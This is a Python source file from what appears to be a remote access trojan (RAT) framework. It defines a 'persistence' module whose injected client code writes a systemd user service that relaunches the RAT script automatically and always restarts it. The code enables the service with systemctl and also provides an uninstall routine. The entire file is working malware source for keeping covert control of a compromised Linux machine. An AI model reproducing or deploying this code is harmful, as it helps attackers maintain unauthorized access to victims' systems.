from modules.rat_module import RatModule

class PersistenceModule(RatModule):
	name = "persistence"
	
	def get_client_code() -> str:
			return """
def install():
	SERVICE_CONFIG = '''
[Unit]
After=network.target

[Service]
ExecStart={}
Restart=always

[Install]
WantedBy=default.target
'''
	
	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
	service_name = f"{state['uid']}.service"
	service_path = os.path.join(sysd_dir, service_name)

	os.makedirs(sysd_dir, exist_ok=True)
	with open(service_path, "w") as f:
		f.write(SERVICE_CONFIG.format(sys.executable + " " + script_path))

	subprocess.run(["systemctl", "--user", "--now", "enable", service_name])

def uninstall():
	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
	service_name = f"{state['uid']}.service"
	service_path = os.path.join(sysd_dir, service_name)

	subprocess.run(["systemctl", "--user", "disable", service_name])
	os.remove(service_path)

modules["persistence"] = {}
modules["persistence"]["uninstall"] = uninstall
modules["persistence"]["install"] = install
modules["persistence"]["postinstall"] = sys.exit
"""